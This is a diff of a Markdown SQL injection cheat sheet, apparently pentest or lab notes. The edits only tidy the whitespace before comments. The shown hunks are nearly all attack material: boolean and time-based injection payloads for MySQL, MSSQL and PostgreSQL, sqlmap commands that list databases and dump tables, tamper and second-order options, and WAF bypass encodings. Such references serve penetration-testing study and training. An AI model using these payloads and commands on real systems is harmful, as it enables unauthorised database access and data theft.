@@ -138,8 +138,8 @@ Check which numbers appear in the page output.
 ### Boolean-Based
 
 ```
-http://$IP/page.php?id=1 AND 1=1 -- //    (normal response)
-http://$IP/page.php?id=1 AND 1=2 -- //    (different response)
+http://$IP/page.php?id=1 AND 1=1 -- // (normal response)
+http://$IP/page.php?id=1 AND 1=2 -- // (different response)
 ```
 
 Extract data character by character:
@@ -155,8 +155,8 @@ Extract data character by character:
 ```sql
 ' AND SLEEP(3)-- //
 ' AND IF(1=1, SLEEP(3), 'false') -- //
-'; WAITFOR DELAY '00:00:05' --       (MSSQL)
-' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--   (PostgreSQL)
+'; WAITFOR DELAY '00:00:05' -- (MSSQL)
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- (PostgreSQL)
 ```
 
 ## Stacked Queries
@@ -224,11 +224,11 @@ sqlmap -r request.txt --string="Wrong identification" --batch
 ### Enumeration
 
 ```bash
-sqlmap -r request.txt --dbs --batch                              # List databases
-sqlmap -r request.txt -D dbname --tables --batch                 # List tables
-sqlmap -r request.txt -D dbname -T users --columns --batch       # List columns
-sqlmap -r request.txt -D dbname -T users --dump --batch          # Dump table
-sqlmap -r request.txt --dump --batch                             # Dump everything
+sqlmap -r request.txt --dbs --batch # List databases
+sqlmap -r request.txt -D dbname --tables --batch # List tables
+sqlmap -r request.txt -D dbname -T users --columns --batch # List columns
+sqlmap -r request.txt -D dbname -T users --dump --batch # Dump table
+sqlmap -r request.txt --dump --batch # Dump everything
 ```
 
 ### RCE
@@ -273,14 +273,14 @@ sqlmap -u "http://$IP/page.php?id=1" --tamper="space2comment,between,randomcase"
 ### Useful Flags
 
 ```bash
---threads=10           # Speed up
---technique=BEUSTQ     # Force techniques (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)
---prefix="')"          # Custom prefix
---suffix="-- -"        # Custom suffix
---dbms=mysql           # Force DBMS type
---second-url="http://$IP/result.php"  # Second-order SQLi
---forms                # Auto-parse forms
---crawl=2              # Crawl depth
+--threads=10 # Speed up
+--technique=BEUSTQ # Force techniques (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)
+--prefix="')" # Custom prefix
+--suffix="-- -" # Custom suffix
+--dbms=mysql # Force DBMS type
+--second-url="http://$IP/result.php" # Second-order SQLi
+--forms # Auto-parse forms
+--crawl=2 # Crawl depth
 ```
 
 ## WAF Bypass Tricks
@@ -288,18 +288,18 @@ sqlmap -u "http://$IP/page.php?id=1" --tamper="space2comment,between,randomcase"
 ### No Spaces
 
 ```sql
-/**/                        -- comment as space
-%09                         -- tab
-%0A                         -- newline
-()                          -- parentheses grouping
-'/**/OR/**/1=1/**/--        -- inline comments
+/**/ -- comment as space
+%09 -- tab
+%0A -- newline
+() -- parentheses grouping
+'/**/OR/**/1=1/**/-- -- inline comments
 ```
 
 ### No Commas
 
 ```sql
-LIMIT 1 OFFSET 0                          -- instead of LIMIT 0,1
-SUBSTR('SQL' FROM 1 FOR 1)                -- instead of SUBSTR('SQL',1,1)
+LIMIT 1 OFFSET 0 -- instead of LIMIT 0,1
+SUBSTR('SQL' FROM 1 FOR 1) -- instead of SUBSTR('SQL',1,1)
 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
 ```
 
@@ -314,17 +314,17 @@ SUBSTRING(VERSION(),1,1) IN (5)
 ### Case & Keyword Tricks
 
 ```sql
-SeLeCt                     -- mixed case
-%53%45%4C%45%43%54         -- URL-encoded SELECT
-&&  instead of AND
-||  instead of OR
+SeLeCt -- mixed case
+%53%45%4C%45%43%54 -- URL-encoded SELECT
+&& instead of AND
+|| instead of OR
 ```
 
 ### Double URL Encoding
 
 ```
-%2527  = %27 = '
-%2522  = %22 = "
+%2527 = %27 = '
+%2522 = %22 = "
 ```
 
 ## Polyglot Payload
